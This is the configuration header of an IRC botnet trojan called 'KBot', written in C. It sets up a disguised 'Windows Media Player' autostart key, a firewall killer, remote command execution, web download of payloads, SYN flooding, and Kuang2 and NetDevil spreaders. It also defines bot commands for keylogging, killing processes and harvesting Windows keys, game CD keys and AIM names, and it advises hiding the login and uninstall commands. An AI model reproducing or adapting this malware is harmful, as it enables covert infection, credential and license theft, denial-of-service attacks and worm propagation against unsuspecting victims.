...
char filename[] = "bot.exe"; //Bot File Name
char password[] = "set"; //Your Bots Password
char channel[] = "#channel"; //Channel Bot Should Join
char channelpass[] = "chanpass"; //Channel Password
const int maxlogins = 2; //Maximum Number Of Logins
char valuename[] = "Windows Media Player"; //Auto Start Key
int decryptkey = 9; //Decrypt Key
char mutexname[] = "setplease"; //Change, If This Is Same On 1 or more bots it will NOT run
char Bot_Version[] = "KBot By Kasket"; //Your Bots Version
char szLocalPayloadFile[] = "payload.dat"; //Payload File Name
BOOL topiccommands = TRUE; //Allow Topic Commands True Or False
int Flood_delay = 2000; //Time To Aviod Flood In ms If Unsure Just Keep Default
#define rawcommands_after_connect;
#define rawcommands_after_join; 
#define meltserver;
#define remote_cmd; 
#define Use_Firewall_killer; //Firewall Killer
#define WEB_DOWNLOAD; //Allow Download
#define SYN_FLOOD; //Syn Flood
#define KUANG2_SPREADER;
#define MAX_PORTSCAN_SOCKETS_TO_USE 30 //Maximun Number Of Socks For Port Scanner
#define GIVE_PING_REPLY; //Ping Reply
#define GIVE_VERSION_REPLY; //Version Reply
#define USE_IDENT_SERVER; //Ident Server
#define DEVIL_SPREADER; //Netdevil Speader

#ifdef GIVE_VERSION_REPLY
const char VERSION_REPLY[] = "Kbot By Kasket";
#endif

/*
Servers Supports Multi Server
eg -
"irc.dal.net",
"mesra.dal.net",
"kbot.ownz.you",
...
/*
Raw Commands To Do When Connected
eg - 
"MODE $NICK +ix",
NULL
*/
...
/*
Raw Commands To Do When Joined Channel
eg - 
"MODE $CHAN +ntspmu",
NULL
*/
...
//Remove the Comments From The Line Below To Use Host Verifcation

//#define use_hostname_match;

/*
Hostnames , supports multi host names
*/
...
//Remove the Comments From The Line Below To Use ident verification

//#define use_ident_match;

/*
Idents , supports idents
*/
...
//Remove the Comments From The Line Below To Use nickname verification

//#define use_nickname_match;

/*
nicknames , supports nicks
*/
...
const char login_command[] = 		".l0gm31n"; //Advice you change this , because packet sniffers listen for .login
...
const char startkeylogger_command[] = 	".keylogger";
const char stopkeylogger_command[] = 	".skeylogger";
const char listprocesses_command[] = 	".listproccess";
const char killprocess_command[] = 	".killproccess";
...
const char uninstall_command[] = 	".changeme"; //Change this so only you know the remove command
const char httpserver_command[] = 	".httpserver";
const char redirect_command[] = 	".redirect";
const char raw_command[] = 		".raw";
#ifdef WEB_DOWNLOAD
const char download_command[] = 	".change"; //Change this so only you know the download command
#endif
#ifdef SYN_FLOOD
...
const char flushdns_command[] = 		".flushdns";
...
const char winkeys_command[] =		".winkeys";
const char gamekeys_command[] =		".cdkeys";
const char aimnames_command[] =		".aim";
const char about_command[] = 		".about";
const char uptime_command[] = 		".uptime";
const char longuptime_command[] = 	".longuptime";
